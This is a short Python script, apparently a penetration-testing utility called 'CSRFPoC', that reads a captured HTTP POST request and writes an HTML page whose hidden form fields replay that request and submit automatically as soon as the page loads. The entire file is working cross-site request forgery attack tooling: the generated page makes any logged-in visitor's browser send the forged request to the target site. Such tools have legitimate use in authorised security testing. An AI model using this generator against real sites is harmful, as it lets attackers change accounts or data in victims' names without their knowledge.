import argparse
import re
from urllib.parse import unquote

banner = '''
###############################################################
#                                                             #
#              CSRFPoC - A Simple CSRF PoC Generator          #
#                                                             #
#                    Created by: Kryptohaker                  #
#                                                             #
###############################################################
'''
print(banner)

def parse_request(request_file):
    with open(request_file, 'r') as file:
        request = file.read()

    url_pattern = re.compile(r'POST (.*?) HTTP')
    url_path = re.search(url_pattern, request).group(1)

    host_pattern = re.compile(r'Host: (.*?)\n')
    host = re.search(host_pattern, request).group(1)

    origin_pattern = re.compile(r'Origin: (https?:\/\/).*\n')
    protocol = re.search(origin_pattern, request).group(1)

    full_url = f"{protocol}{host}{url_path}"

    headers, body = request.split('\n\n', 1)
    body = unquote(body)

    return full_url, body


def generate_html_poc(url, body, output_file):
    print("Generating PoC...")

    form_inputs = []

    for param in body.split('&'):
        name, value = param.split('=')
        form_inputs.append(f'<input type="hidden" name="{name}" value="{value}">\n')

    html_poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <form method="POST" action="{url}">
        {''.join(form_inputs)}
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>"""

    with open(output_file, 'w') as file:
        file.write(html_poc)

    print(f"PoC saved to {output_file} file.")


def main():
    parser = argparse.ArgumentParser(description="Generate a CSRF PoC HTML file from a request")
    parser.add_argument('-r', '--request', type=str, required=True, help='Path to the request file')
    parser.add_argument('-o', '--output', type=str, default='PoC.html', help='Path to the output HTML PoC file')
    args = parser.parse_args()

    url, body = parse_request(args.request)
    generate_html_poc(url, body, args.output)


if __name__ == '__main__':
    main()
